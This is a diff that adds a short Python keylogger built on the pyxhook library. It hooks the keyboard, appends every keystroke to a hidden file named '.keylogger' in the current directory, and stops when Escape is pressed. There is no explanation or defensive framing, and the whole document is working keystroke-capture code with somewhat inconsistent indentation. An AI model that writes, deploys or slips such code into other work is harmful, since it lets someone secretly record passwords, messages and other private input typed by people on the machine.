@@ -1,0 +1,25 @@
+ import pyxhook
+ import time
+ def newline():
+ 	file = open('.keylogger', 'a')
+ 	file.write('\n')
+ 	file.close()
+ def key_press_event(event):
+     global running
+     if event.Key != 'space' and event.Key != 'Escape':
+ 	    with open('.keylogger', 'a+') as File:
+ 	    	File.write(event.Key)
+     if event.Key == 'space':
+         newline()
+     if event.Key == 'Escape':
+         running = False
+         newline()
+ if __name__ == '__main__':
+ 	hookman = pyxhook.HookManager()
+ 	hookman.KeyDown = key_press_event
+ 	hookman.HookKeyboard()
+ 	hookman.start()
+ 	running = True
+ 	while running:
+ 	    time.sleep(0.1)
+ 	hookman.cancel()
